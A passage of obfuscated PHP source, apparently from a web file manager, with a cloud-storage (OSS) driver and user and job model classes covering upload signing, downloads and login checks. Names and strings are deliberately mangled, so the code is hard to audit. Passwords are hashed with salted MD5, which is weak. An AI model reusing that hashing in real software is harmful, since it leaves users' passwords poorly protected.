$œªÛ[33]; $ş€Ô×Ôõ™ = $™µåªéÅã; if (isset($·ÚÍÜ[$œªÛ[93]])) { $ş€Ô×Ôõ™ = $·ÚÍÜ[$œªÛ[93]]; unset($·ÚÍÜ[$œªÛ[93]]); } if (isset($·ÚÍÜ[$œªÛ[223]])) { $·ÚÍÜ[$œªÛ[222]] = $ìŞëŠûõë´¨; return $this->listUploadParts($ş€Ô×Ôõ™, $·ÚÍÜ); } $Øï = array($œªÛ[224], $œªÛ[33], $œªÛ[119], $ìŞëŠûõë´¨, "\x78\x2d\x6f\x73\163\55\x64\x61\x74\x65\x3a{$ìŞëŠûõë´¨}", $œªÛ[8] . $this->bucket . $œªÛ[8] . $ş€Ô×Ôõ™ . $ÔöÏ®¡¸); if (strpos($ÔöÏ®¡¸, $œªÛ[225]) === 0) { $Øï[0] = $œªÛ[226]; if ($ˆ£ = $this->trafficLimit($œªÛ[1331])) { $ş€Ô×Ôõ™ = $œªÛ[1340]; array_splice($Øï, 5, 0, $ş€Ô×Ôõ™ . $œªÛ[4] . $ˆ£[$ş€Ô×Ôõ™]); } } if (isset($·ÚÍÜ[$œªÛ[227]]) && $·ÚÍÜ[$œªÛ[227]] == $œªÛ[228]) { $Øï[0] = $œªÛ[228]; } if (!empty($·ÚÍÜ[$œªÛ[1341]])) { $ê·Ùö = array_merge(array($Øï[4]), $·ÚÍÜ[$œªÛ[1341]]); sort($ê·Ùö); $Øï[4] = implode($œªÛ[229], $ê·Ùö); } $ğóåï = implode($œªÛ[229], $Øï); $âÌØ = base64_encode(hash_hmac($œªÛ[230], $ğóåï, $this->secret, !0)); $‰¤£“¡Áê = $œªÛ[1305] . $this->accessKey . $œªÛ[4] . $âÌØ; if (strpos($ÔöÏ®¡¸, $œªÛ[225]) === 0) { $‰¤£“¡Áê = array($œªÛ[232] => $‰¤£“¡Áê, $œªÛ[222] => $ìŞëŠûõë´¨); if ($ˆ£) { $‰¤£“¡Áê = array_merge($‰¤£“¡Áê, $ˆ£); } } return $‰¤£“¡Áê; } public function listUploadParts($¥·şÚ¤Û, $ôŸÊ) { $œâÎä¢ =& $_SERVER[ÀÆ]; $÷³ = parse_url_query($ôŸÊ[$œâÎä¢[168]]); $ÁæŠ°îÍæ = $this->client->listParts($this->bucket, $this->pathEncode($¥·şÚ¤Û), $÷³[$œâÎä¢[221]]); $âèôÅíßş = $ÁæŠ°îÍæ->getListPart(); $´¿›ï«ˆà = array(); foreach ($âèôÅíßş as $Ì¿Öœ÷«¹˜) { $´¿›ï«ˆà[] = array($œâÎä¢[1325] => $Ì¿Öœ÷«¹˜->getPartNumber(), $œâÎä¢[1326] => trim($Ì¿Öœ÷«¹˜->getETag(), $œâÎä¢[116])); } unset($ôŸÊ[$œâÎä¢[223]], $ôŸÊ[$œâÎä¢[227]]); $Üò«Åß»úœ = $this->multiUploadAuthData($¥·şÚ¤Û, $ôŸÊ); if (empty($Üò«Åß»úœ)) { return !1; } return array($œâÎä¢[232] => $Üò«Åß»úœ, $œâÎä¢[222] => $ôŸÊ[$œâÎä¢[222]], $œâÎä¢[234] => $´¿›ï«ˆà); } public function download($ƒ£½‡È›æé, $¾Úö) { if ($this->isFolder($ƒ£½‡È›æé)) { return !1; } try { $Ûê = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $¾Úö); $Ûê = $this->trafficLimit($_SERVER[ÀÆ][109], $Ûê); $this->client->getObject($this->bucket, $this->pathEncode($ƒ£½‡È›æé), $Ûê); } catch (OSS\Core\OssException $¯¥÷¥ò¡ä) { return !1; } return $¾Úö; } public function fileSubstr($ö™£Èü, $¤€„ä›ø·Ó = 0, $™ÊòÇíô… = false) { if ($¤€„ä›ø·Ó === -1) { $®¾ = array(); } else { if ($™ÊòÇíô… === !1) { $Û¦ı™Œ× = $this->size($ö™£Èü); } else { $Û¦ı™Œ× = $¤€„ä›ø·Ó + $™ÊòÇíô… - 1; } $®¾ = array(OSS\OssClient::OSS_RANGE => "{$¤€„ä›ø·Ó}\x2d{$Û¦ı™Œ×}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ö™£Èü), $®¾); } catch (OSS\Core\OssException $”±Üñ) { think_exception($”±Üñ->getMessage()); return !1; } } private function trafficLimit($àòóªë, $ÔÈ²î = array()) { $•Éô‰¦° =& $_SERVER[ÀÆ]; if ($àòóªë == $•Éô‰¦°[1331] && $this->isUploadServer() || $àòóªë == $•Éô‰¦°[109] && $this->isFileOutServer()) { return $ÔÈ²î; } $¸‡¨ØŒ‚¬ÌĞ = floatval($GLOBALS[$•Éô‰¦°[6]][$•Éô‰¦°[88]][$•Éô‰¦°[107]][$àòóªë]) * 1024 * 1024 * 8; if (!$¸‡¨ØŒ‚¬ÌĞ) { return $ÔÈ²î; } $¸‡¨ØŒ‚¬ÌĞ = $¸‡¨ØŒ‚¬ÌĞ < 819200 ? 819200 : ($¸‡¨ØŒ‚¬ÌĞ > 838860800 ? 838860800 : $¸‡¨ØŒ‚¬ÌĞ); $ÔÈ²î[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($¸‡¨ØŒ‚¬ÌĞ); return $ÔÈ²î; } public function link($¡Ç‘­à¦×, $Ü‹µ = array()) { $÷üíÜå»üÃ =& $_SERVER[ÀÆ]; if (!$this->exist($¡Ç‘­à¦×) || $this->isFolder($¡Ç‘­à¦×)) { return !1; } try { $Ü‹µ = $this->trafficLimit($÷üíÜå»üÃ[109], $Ü‹µ); $ùı¾Ë–Úõ½“ = $this->client->signUrl($this->bucket, $this->pathEncode($¡Ç‘­à¦×), 3600 * 12, $÷üíÜå»üÃ[228], $Ü‹µ); return $this->getCdnLink($ùı¾Ë–Úõ½“); } catch (OSS\Core\OssException $ÔÊ) { return !1; } } public function fileOut($Ï¢¬¦¯¯íñ, $İà = false, $«õ³¦˜³²¥ù = false, $ª÷®Ò¡ = '') { $×Ó• =& $_SERVER[ÀÆ]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ï¢¬¦¯¯íñ, $İà, $«õ³¦˜³²¥ù, $ª÷®Ò¡); } if (!$«õ³¦˜³²¥ù) { $«õ³¦˜³²¥ù = $this->pathThis($Ï¢¬¦¯¯íñ); } $«õ³¦˜³²¥ù = rawurlencode($«õ³¦˜³²¥ù); $ºÊµŸì– = get_file_mime(get_path_ext($«õ³¦˜³²¥ù)); if ($ºÊµŸì– == $×Ó•[213]) { return parent::fileOut($Ï¢¬¦¯¯íñ, $İà, $«õ³¦˜³²¥ù, $ª÷®Ò¡); } $İà = $İà ? $×Ó•[214] : $×Ó•[215]; $Ô¶ò¹ = array(OSS\OssClient::OSS_SUB_RESOURCE => $×Ó•[1342] . rawurlencode("{$İà}\73\x66\151\x6c\145\156\x61\x6d\145\75{$«õ³¦˜³²¥ù}")); $Ô¶ò¹[OSS\OssClient::OSS_SUB_RESOURCE] .= $×Ó•[1343] . rawurlencode($ºÊµŸì–); $ğ·õ‡ç = $this->link($Ï¢¬¦¯¯íñ, $Ô¶ò¹); $this->fileOutLink($ğ·õ‡ç); } public function fileOutServer($áÏöÑÂ»ü•, $½ = false, $ˆîš’‰‡ = false, $„È¸ççÄ = '') { parent::fileOut($áÏöÑÂ»ü•, $½, $ˆîš’‰‡, $„È¸ççÄ); } public function fileOutImage($ ïúö, $ÑĞŸ = 250) { $¾ãÆ”‘è¾ğ½ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ÀÆ][1344] . $ÑĞŸ); $šö™• = $this->link($ ïúö, $¾ãÆ”‘è¾ğ½); $this->fileOutLink($šö™•); } public function fileOutImageServer($çâˆ, $ç±†¡×˜İŒ = 250) { parent::fileOutImage($çâˆ, $ç±†¡×˜İŒ); } public function fileOutLink($¤¥) { $œ³Çºİğ” =& $_SERVER[ÀÆ]; if (!$this->isCdnHost() && substr($¤¥, 0, 7) == $œ³Çºİğ”[1248]) { $¤¥ = $œ³Çºİğ”[1249] . substr($¤¥, 7); } header($œ³Çºİğ”[159] . $¤¥); die; } public function hashMd5($¥ëÎŞç¨Ÿ¯, $úº«ø¦ç = '') { $¼³³Â =& $_SERVER[ÀÆ]; $â…•¦’ = $this->_objectMeta($¥ëÎŞç¨Ÿ¯); if (!$â…•¦’) { return $¼³³Â[33]; } if (!isset($â…•¦’[$¼³³Â[1321]]) && !empty($úº«ø¦ç)) { $ÎšÆ³ü = $this->updateObjMeta($¥ëÎŞç¨Ÿ¯, array($¼³³Â[1321] => $úº«ø¦ç)); $â…•¦’[$¼³³Â[1321]] = $ÎšÆ³ü ? $úº«ø¦ç : $¼³³Â[33]; } return isset($â…•¦’[$¼³³Â[1321]]) ? strtolower($â…•¦’[$¼³³Â[1321]]) : $¼³³Â[33]; } public function size($°×) { $—‘Á = $this->objectMeta($°×); return $—‘Á ? $—‘Á[$_SERVER[ÀÆ][78]] : 0; } public function info($àšÎñÎ) { if ($this->isFolder($àšÎñÎ)) { return $this->folderInfo($àšÎñÎ); } else { if ($this->isFile($àšÎñÎ)) { return $this->fileInfo($àšÎñÎ); } } return !1; } public function exist($¡¬ ¤Ş†õ) { return $this->isFile($¡¬ ¤Ş†õ) || $this->isFolder($¡¬ ¤Ş†õ); } public function isFile($Ïª¼À½¦ø÷–ğ) { return !$this->isFolder($Ïª¼À½¦ø÷–ğ) && $this->objectMeta($Ïª¼À½¦ø÷–ğ); } public function isFolder($šÓ´¢òöÔ) { return $this->cacheMethod($_SERVER[ÀÆ][199], $šÓ´¢òöÔ); } protected function objectMeta($æ¿¦) { return $this->cacheMethod($_SERVER[ÀÆ][200], $æ¿¦); } protected function _objectMeta($ÊöÀÉœ¯«¨’±) { $èÊ—åÒ =& $_SERVER[ÀÆ]; try { $©†¥é§è² = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ÊöÀÉœ¯«¨’±)); } catch (OSS\Core\OssException $õıÆá‡„Óì) { $©†¥é§è² = !1; } if ($©†¥é§è²) { $©†¥é§è²[$èÊ—åÒ[78]] = intval($©†¥é§è²[$èÊ—åÒ[1319]]); } return $©†¥é§è²; } protected function _isFolder($Õ°ÄÎ¶¤Õ´) { $‡âé‚ù¢… =& $_SERVER[ÀÆ]; if ($Õ°ÄÎ¶¤Õ´ == $‡âé‚ù¢…[33] || $Õ°ÄÎ¶¤Õ´ == $‡âé‚ù¢…[8]) { return !0; } $‘Ü‡•ˆä = array($‡âé‚ù¢…[1315] => $‡âé‚ù¢…[8], $‡âé‚ù¢…[1316] => rtrim($Õ°ÄÎ¶¤Õ´, $‡âé‚ù¢…[8]) . $‡âé‚ù¢…[8], $‡âé‚ù¢…[1317] => 1, $‡âé‚ù¢…[1318] => $‡âé‚ù¢…[33]); $ÎÛÓ = $this->client->listObjects($this->bucket, $‘Ü‡•ˆä); if ($ÎÛÓ->getObjectList() || $ÎÛÓ->getPrefixList()) { return !0; } return !1; } } goto F‰Ÿåƒ¾“ƒ; dÍÙÑÏñ: class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\x2e\x6a\x6f\x62\114\151\x73\164"; public $field = array("\156\141\x6d\145", "\x64\145\163\x63", "\163\157\162\x74"); const JOB_KEY = "\163\x65\154\x66\x4a\157\x62\x4c\x69\163\164"; public function listData($¡á = false, $©¸ØâåëˆÔ = "\x73\157\162\x74", $…“ = false) { return parent::listData($¡á, $©¸ØâåëˆÔ, $…“); } public function remove($ŒÕ©) { return parent::remove($ŒÕ©); } public function add($¦ÂÅõÆé) { $ç›ë =& $_SERVER[ÀÆ]; if ($this->findByName($¦ÂÅõÆé[$ç›ë[28]])) { return !1; } $¦ÂÅõÆé[$ç›ë[1762]] = $this->getSort(); return parent::insert($¦ÂÅõÆé); } private function getSort() { $à£¯äœ¶ş =& $_SERVER[ÀÆ]; $Àş’Úİ‡ùÆÓ = parent::listData(); $áéºâ¸„³š = array_to_keyvalue($Àş’Úİ‡ùÆÓ, $à£¯äœ¶ş[33], $à£¯äœ¶ş[1762]); return empty($áéºâ¸„³š) ? 0 : max($áéºâ¸„³š) + 1; } public function update($ÒéëŠØ, $ıáö—¶º’Ï) { $¨ş =& $_SERVER[ÀÆ]; $Áã…„ = parent::listData($ÒéëŠØ); $…Ú = $this->findByName($ıáö—¶º’Ï[$¨ş[28]]); if (!$Áã…„ || $…Ú && $…Ú[$¨ş[395]] != $Áã…„[$¨ş[395]]) { return !1; } return parent::update($ÒéëŠØ, $ıáö—¶º’Ï); } public function setUserJob($ƒÙÀ, $üğŠÏœç®ò¿) { $‘Ì¥ı½ô =& $_SERVER[ÀÆ]; if (!is_array($üğŠÏœç®ò¿)) { $üğŠÏœç®ò¿ = array($üğŠÏœç®ò¿); } $¸¼¶‹ = parent::listData(); $ÉÊÙÍ = array_to_keyvalue($¸¼¶‹, $‘Ì¥ı½ô[28]); $Í»½È¸¥ë = $‘Ì¥ı½ô[376]; foreach ($üğŠÏœç®ò¿ as $±˜Ç…°ñéÍ€) { if ($ÉÊÙÍ[$±˜Ç…°ñéÍ€]) { $Í»½È¸¥ë .= $ÉÊÙÍ[$±˜Ç…°ñéÍ€][$‘Ì¥ı½ô[395]] . $‘Ì¥ı½ô[47]; } else { $şØ™ = $this->add($±˜Ç…°ñéÍ€); $Í»½È¸¥ë .= $şØ™ . $‘Ì¥ı½ô[47]; } } $Í»½È¸¥ë = rtrim($Í»½È¸¥ë, $‘Ì¥ı½ô[47]); Model($‘Ì¥ı½ô[532])->metaSet($ƒÙÀ, self::JOB_KEY, $Í»½È¸¥ë); } public function getUserJob($ñÚ€êÎ) { $¨ŞæıÒ = Model($_SERVER[ÀÆ][532])->metaGet($ñÚ€êÎ); return $this->getUserJobInfo($¨ŞæıÒ[self::JOB_KEY]); } public function getUserJobInfo($ÅÇ) { $’ˆõÌüŸ =& $_SERVER[ÀÆ]; $ôä = explode($’ˆõÌüŸ[47], $ÅÇ); $·ÅñÒÂö = parent::listData(); $·ÅñÒÂö = array_remove_key($·ÅñÒÂö, $’ˆõÌüŸ[194]); $¬¢ = array(); foreach ($ôä as $¼Ù×‚) { if (isset($·ÅñÒÂö[$¼Ù×‚])) { $¬¢[] = $·ÅñÒÂö[$¼Ù×‚]; } } return $¬¢; } } class UserModel extends ModelBase { protected $tableName = "\165\163\145\162"; protected $tableMeta = array("\164\x61\x62\154\145\x4e\141\x6d\x65" => "\x75\x73\145\162\137\x6d\145\164\x61", "\x6d\x65\164\141\x46\151\x65\154\x64" => "\165\163\145\162\x49\104"); protected $simpleField = "\165\x73\x65\x72\x49\x44\x2c\x6e\x69\143\x6b\x4e\x61\155\x65\54\156\141\x6d\x65\x2c\x61\x76\141\164\x61\162\x2c\163\145\x78\54\163\x74\141\164\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ıİÀ) { $íŸŒ =& $_SERVER[ÀÆ]; $«…à§ğ± = $íŸŒ[2167]; return array($íŸŒ[1816] => array($ıİÀ[0], $«…à§ğ±), $íŸŒ[1818] => array($ıİÀ[0], $«…à§ğ±), $íŸŒ[2168] => array($ıİÀ[0], $«…à§ğ±)); } protected function getInfo($ñù, $ªá”üú = false) { $¼º¾±÷¦…ª÷ = $this->getInfoSimple($ñù); if (!is_array($¼º¾±÷¦…ª÷)) { return array(); } if ($ªá”üú) { return $this->_getInfoApply($¼º¾±÷¦…ª÷); } return $this->cacheFunctionGet($_SERVER[ÀÆ][1820], $ñù); } protected function getInfoFull($í›Š¡, $¡µã‹ = false) { $œŒë…©å´ºü = $this->getInfoSimple($í›Š¡); if (!is_array($œŒë…©å´ºü)) { return array(); } if ($¡µã‹) { return $this->_getInfoApply($œŒë…©å´ºü, !0); } return $this->cacheFunctionGet($_SERVER[ÀÆ][2169], $í›Š¡); } private function _getInfoApply($Ã™“õùúá, $–‹…ÂüŒ®ÄÀ = false) { $°Å©Æà “ =& $_SERVER[ÀÆ]; if (!$Ã™“õùúá) { return $Ã™“õùúá; } $Óú„Œ÷Ø = md5($°Å©Æà “[2170] . $Ã™“õùúá[$°Å©Æà “[883]] . $°Å©Æà “[2171] . $Ã™“õùúá[$°Å©Æà “[28]]); $Ã™“õùúá = $this->_listDataApplyItem($Ã™“õùúá); $›²ÊŞØµÂ™’ = Model($°Å©Æà “[1250])->metaGet($Ã™“õùúá[$°Å©Æà “[85]][$°Å©Æà “[397]]); $Ã™“õùúá[$°Å©Æà “[2172]] = $Óú„Œ÷Ø; $Ã™“õùúá[$°Å©Æà “[85]][$°Å©Æà “[2003]] = isset($›²ÊŞØµÂ™’[$°Å©Æà “[2004]]) ? $›²ÊŞØµÂ™’[$°Å©Æà “[2004]] : null; if ($–‹…ÂüŒ®ÄÀ) { $Ã™“õùúá[$°Å©Æà “[459]] = $this->metaGet($Ã™“õùúá[$°Å©Æà “[1572]]); } return $Ã™“õùúá; } protected function getInfoSimple($îó, $Æøõ = false) { $±£ =& $_SERVER[ÀÆ]; if (!$îó) { return array(); } if ($Æøõ) { $ÆâõÔé¥é¼Ò = $this->where(array($±£[1572] => intval($îó)))->find(); if (!is_array($ÆâõÔé¥é¼Ò)) { return array(); } $ÆâõÔé¥é¼Ò[$±£[2173]] = Action($±£[2174])->parseUrl($ÆâõÔé¥é¼Ò[$±£[2173]]); return $ÆâõÔé¥é¼Ò; } return $this->cacheFunctionGet($±£[1821], $îó); } protected function getInfoSimpleOuter($Œì¥ÉÀ) { $ÔŞšÕƒ£Ò±ã =& $_SERVER[ÀÆ]; if (!$Œì¥ÉÀ || $Œì¥ÉÀ == 0) { return array($ÔŞšÕƒ£Ò±ã[1572] => $ÔŞšÕƒ£Ò±ã[191], $ÔŞšÕƒ£Ò±ã[28] => $ÔŞšÕƒ£Ò±ã[160] . LNG($ÔŞšÕƒ£Ò±ã[2175]) . $ÔŞšÕƒ£Ò±ã[530], $ÔŞšÕƒ£Ò±ã[2173] => STATIC_PATH . $ÔŞšÕƒ£Ò±ã[2176]); } $Œğ = $this->cacheFunctionGet($ÔŞšÕƒ£Ò±ã[1821], $Œì¥ÉÀ); $À× = array_field_key($Œğ, explode($ÔŞšÕƒ£Ò±ã[47], $this->simpleField)); if (!$À×) { return array($ÔŞšÕƒ£Ò±ã[1572] => $ÔŞšÕƒ£Ò±ã[1117], $ÔŞšÕƒ£Ò±ã[28] => $ÔŞšÕƒ£Ò±ã[160] . LNG($ÔŞšÕƒ£Ò±ã[2177]) . $ÔŞšÕƒ£Ò±ã[530], $ÔŞšÕƒ£Ò±ã[2173] => STATIC_PATH . $ÔŞšÕƒ£Ò±ã[2178]); } $À×[$ÔŞšÕƒ£Ò±ã[2173]] = Action($ÔŞšÕƒ£Ò±ã[2174])->parseUrl($À×[$ÔŞšÕƒ£Ò±ã[2173]]); return $À×; } protected function groupUser($áş) { } public static function errorLang($’À) { $ö”«Š =& $_SERVER[ÀÆ]; $¾é¾ğèØêœ½» = array(self::ERROR_USER_NOT_EXISTS => $ö”«Š[2179], self::ERROR_USER_PASSWORD_ERROR => $ö”«Š[2180], self::ERROR_USER_EXIST_NAME => $ö”«Š[2181], self::ERROR_USER_EXIST_PHONE => $ö”«Š[2182], self::ERROR_USER_EXIST_EMAIL => $ö”«Š[2183], self::ERROR_USER_LOGIN_LOCK => $ö”«Š[2184], self::ERROR_IP_NOT_ALLOW => $ö”«Š[2185], self::ERROR_USER_EXIST_NICKNAME => $ö”«Š[2186]); return LNG($¾é¾ğèØêœ½»[$’À]); } public function getInfoByMeta($ÂåÄ¤ÓÎ, $¯) { $  ¥ =& $_SERVER[ÀÆ]; $¾‚Õ = Model($  ¥[2187])->where(array($  ¥[93] => $ÂåÄ¤ÓÎ, $  ¥[372] => $¯))->find(); if ($¾‚Õ) { return $this->getInfo($¾‚Õ[$  ¥[1572]]); } return !1; } public function userLoginCheck($ùáØÄ¤Â­¦, $ÄÏ¶»‡»’Ù) { $æ˜ô =& $_SERVER[ÀÆ]; $Ğ¾ñö = $this->userLoginFind($ùáØÄ¤Â­¦); if (!$Ğ¾ñö) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Ğ¾ñö[$æ˜ô[1572]], $ÄÏ¶»‡»’Ù)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($Ğ¾ñö[$æ˜ô[1572]]); } public function userLoginFind($û°Àƒì„ì) { $µÈ¡ˆ =& $_SERVER[ÀÆ]; $ì¹œ”¸Èƒ—İ = array($µÈ¡ˆ[28] => $û°Àƒì„ì, $µÈ¡ˆ[2007] => $û°Àƒì„ì, $µÈ¡ˆ[303] => $û°Àƒì„ì, $µÈ¡ˆ[2188] => $û°Àƒì„ì, $µÈ¡ˆ[991] => $µÈ¡ˆ[993]); if ($this->nickNameRpt()) { unset($ì¹œ”¸Èƒ—İ[$µÈ¡ˆ[2007]]); } return $this->where($ì¹œ”¸Èƒ—İ)->find(); } public function clearCache($›ÁÈÆàÑÕ±¹) { $ßóÇ¹ñ®Š° =& $_SERVER[ÀÆ]; $this->cacheFunctionClear($ßóÇ¹ñ®Š°[1820], $›ÁÈÆàÑÕ±¹); $this->cacheFunctionClear($ßóÇ¹ñ®Š°[1821], $›ÁÈÆàÑÕ±¹); $this->cacheFunctionClear($ßóÇ¹ñ®Š°[2169], $›ÁÈÆàÑÕ±¹); } public function userPasswordCheck($—êóÂÚŞ, $ŒÕíõë§ïñ) { $÷‰Î™šíÙ© Ô =& $_SERVER[ÀÆ]; $©õÎ = $this->where(array($÷‰Î™šíÙ© Ô[1572] => intval($—êóÂÚŞ)))->find(); $—…¸Ìá¹ë = $this->metaGet($—êóÂÚŞ); $Ûá¿… = isset($—…¸Ìá¹ë[$÷‰Î™šíÙ© Ô[2189]]) ? $—…¸Ìá¹ë[$÷‰Î™šíÙ© Ô[2189]] : $÷‰Î™šíÙ© Ô[33]; if (md5($Ûá¿… . trim($ŒÕíõë§ïñ)) !== $©õÎ[$÷‰Î™šíÙ© Ô[883]]) { return !1; } return !0; } public function userAdd($ÔŸ) { $§òÈÀµ…Ï¸ =& $_SERVER[ÀÆ]; $–ï¾ = array($§òÈÀµ…Ï¸[415] => $ÔŸ[$§òÈÀµ…Ï¸[28]], $§òÈÀµ…Ï¸[2190] => $ÔŸ[$§òÈÀµ…Ï¸[1454]], $§òÈÀµ…Ï¸[2191] => isset($ÔŸ[$§òÈÀµ…Ï¸[303]]) ? $ÔŸ[$§òÈÀµ…Ï¸[303]] : $§òÈÀµ…Ï¸[33], $§òÈÀµ…Ï¸[2192] => isset($ÔŸ[$§òÈÀµ…Ï¸[2188]]) ? $ÔŸ[$§òÈÀµ…Ï¸[2188]] : $§òÈÀµ…Ï¸[33], $§òÈÀµ…Ï¸[2193] => isset($ÔŸ[$§òÈÀµ…Ï¸[2007]]) ? $ÔŸ[$§òÈÀµ…Ï¸[2007]] : $ÔŸ[$§òÈÀµ…Ï¸[28]], $§òÈÀµ…Ï¸[2194] => isset($ÔŸ[$§òÈÀµ…Ï¸[2173]]) ? $ÔŸ[$§òÈÀµ…Ï¸[2173]] : $§òÈÀµ…Ï¸[33], $§òÈÀµ…Ï¸[2195] => isset($ÔŸ[$§òÈÀµ…Ï¸[2196]]) ? $ÔŸ[$§òÈÀµ…Ï¸[2196]] : 1, $§òÈÀµ…Ï¸[2197] => $ÔŸ[$§òÈÀµ…Ï¸[883]], $§òÈÀµ…Ï¸[1822] => isset($ÔŸ[$§òÈÀµ…Ï¸[1725]]) ? $ÔŸ[$§òÈÀµ…Ï¸[1725]] : 1024 * 1024 * 20, $§òÈÀµ…Ï¸[1823] => 0, $§òÈÀµ…Ï¸[2198] => 0, $§òÈÀµ…Ï¸[1865] => isset($ÔŸ[$§òÈÀµ…Ï¸[735]]) ? $ÔŸ[$§òÈÀµ…Ï¸[735]] : 1); if (!empty($ÔŸ[$§òÈÀµ…Ï¸[1572]])) { $–ï¾[$§òÈÀµ…Ï¸[1572]] = $ÔŸ[$§òÈÀµ…Ï¸[1572]]; } $ìË¨¤‡ = $this->_checkExist($ÔŸ); if ($ìË¨¤‡ !== !0) { return $ìË¨¤‡; } $„ï†‘à¹ = $this->add($–ï¾); $åñ–æ•¬ = array($§òÈÀµ…Ï¸[2197] => $–ï¾[$§òÈÀµ…Ï¸[883]], $§òÈÀµ…Ï¸[2193] => $–ï¾[$§òÈÀµ…Ï¸[2007]]); $this->userEdit($„ï†‘à¹, $åñ–æ•¬); Model($§òÈÀµ…Ï¸[1250])->userRootAdd($„ï†‘à¹); return $„ï†‘à¹; } protected function userEditTest($Ñ»í¼¤ÎÛû, $üï„êøÙÌ) { return $this->call($_SERVER[ÀÆ][2199], $Ñ»í¼¤ÎÛû, $üï„êøÙÌ); } protected function userEdit($¾õ¡’É”ê£, $øÉ§) { $µ  =& $_SERVER[ÀÆ]; $“ÊšÃ·– = $this->getInfoSimple($¾õ¡’É”ê£); if (!$“ÊšÃ·–) { return !1; } $ĞèŠÑ¥¤Œ = $this->_checkExist($øÉ§, $¾õ¡’É”ê£); if ($ĞèŠÑ¥¤Œ !== !0) { return $ĞèŠÑ¥¤Œ; } if (isset($øÉ§[$µ [883]]) && trim($øÉ§[$µ [883]]) != $µ [33]) { $ÌÖ‘ = $this->metaGet($¾õ¡’É”ê£); if (empty($ÌÖ‘[$µ [2189]])) { $ÌÖ‘[$µ [2189]] = rand_string(10); Model($µ [507])->metaSet($¾õ¡’É”ê£, $µ [2189], $ÌÖ‘[$µ [2189]]); } $øÉ§[$µ [883]] = md5($ÌÖ‘[$µ [2189]] . trim($øÉ§[$µ [883]])); } else { unset($øÉ§[$µ [883]]); } $this->where(array($µ [1563] => $¾õ¡’É”ê£))->save($øÉ§); if (isset($øÉ§[$µ [2007]])) { $this->setNamePinyin($¾õ¡’É”ê£, $øÉ§[$µ [2007]]); } $this->clearCache($¾õ¡’É”ê£); return !0; } public function setNamePinyin($³°áºû, $¸Š„Ğ´Ã = false) { $óşÇ­…ê =& $_SERVER[ÀÆ]; if (!$¸Š„Ğ´Ã) { $“Ş•Ö¹ = $this->getInfoSimple($³°áºû); $¸Š„Ğ´Ã = $“Ş•Ö¹[$óşÇ­…ê[2007]] ? $“Ş•Ö¹[$óşÇ­…ê[2007]] : $“Ş•Ö¹[$óşÇ­…ê[28]]; } $İ“á = Model($óşÇ­…ê[532]); if (!Input::check($¸Š„Ğ´Ã, $óşÇ­…ê[581])) { return $İ“á->metaSet($³°áºû, array($óşÇ­…ê[458] => $óşÇ­…ê[33], $óşÇ­…ê[457] => $óşÇ­…ê[33])); } return $İ“á->metaSet($³°áºû, array($óşÇ­…ê[458] => str_replace($óşÇ­…ê[50], $óşÇ­…ê[33], Pinyin::get($¸Š„Ğ´Ã)), $óşÇ­…ê[457] => Pinyin::get($¸Š„Ğ´Ã, $óşÇ­…ê[582]))); } private function nickNameRpt() { $ëûÒ€ª =& $_SERVER[ÀÆ]; $„Œãá…Û£ = Model($ëûÒ€ª[755])->get($ëûÒ€ª[2200]); $Æ = $GLOBALS[$ëûÒ€ª[6]][$ëûÒ€ª[379]][$ëûÒ€ª[2200]]; $ÛÇ¾‡’’­ì = !is_null($„Œãá…Û£) ? $„Œãá…Û£ : $Æ; return !!$ÛÇ¾‡’’­ì; } private function _checkExist($èØ‰ˆ ›§ , $ôî”ƒ = false) { $óÅ™œ³– =& $_SERVER[ÀÆ]; $öÒ²ŞïåÃ­ = array($óÅ™œ³–[28] => UserModel::ERROR_USER_EXIST_NAME, $óÅ™œ³–[2007] => UserModel::ERROR_USER_EXIST_NICKNAME, $óÅ™œ³–[303] => UserModel::ERROR_USER_EXIST_EMAIL, $óÅ™œ³–[2188] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($öÒ²ŞïåÃ­[$óÅ™œ³–[2007]]); } $Î®ä‚ = $ôî”ƒ ? array($óÅ™œ³–[1572] => array($óÅ™œ³–[2201], $ôî”ƒ)) : array(); foreach ($öÒ²ŞïåÃ­ as $ü“ÁÛÄ£ => $Ø¼À¬Á) { $ä´‰â¥¥ = array(); foreach ($öÒ²ŞïåÃ­ as $«†ƒğšò¶Ä => $×ƒÉöÁå) { if (isset($èØ‰ˆ ›§ [$«†ƒğšò¶Ä]) && $èØ‰ˆ ›§ [$«†ƒğšò¶Ä]) { $ä´‰â¥¥[] = $èØ‰ˆ ›§ [$«†ƒğšò¶Ä]; } } if (!$ä´‰â¥¥) { continue; } $æÕäã = array_merge(array($ü“ÁÛÄ£ => array($óÅ™œ³–[7], $ä´‰â¥¥)), $Î®ä‚); $Îüãğû = $this->where($æÕäã)->find(); if ($Îüãğû) { return $Ø¼À¬Á; } } return !0; } public function userListInfo($¿ñˆ) { $™°§‚ =& $_SERVER[ÀÆ]; $İæıËâğ ¤ = array(); $¿ñˆ = is_array($¿ñˆ) ? array_unique($¿ñˆ) : array(); if (!$¿ñˆ) { return $İæıËâğ ¤; } if (count($¿ñˆ) < 20) { foreach ($¿ñˆ as $êâÉ¦å¸) { $İæıËâğ ¤[$êâÉ¦å¸ . $™°§‚[33]] = $this->getInfoSimpleOuter($êâÉ¦å¸); } } else { $ØŒûôÉá = array($™°§‚[1563] => array($™°§‚[413], $¿ñˆ)); if (count($¿ñˆ) == 1) { $ØŒûôÉá = array($™°§‚[1563] => $¿ñˆ[0]); } $· = Model($™°§‚[507])->field($this->simpleField)->where($ØŒûôÉá)->select(); $· = array_to_keyvalue($·, $™°§‚[1572]); foreach ($¿ñˆ as $êâÉ¦å¸) { $ÔöĞÔŒò·Á = 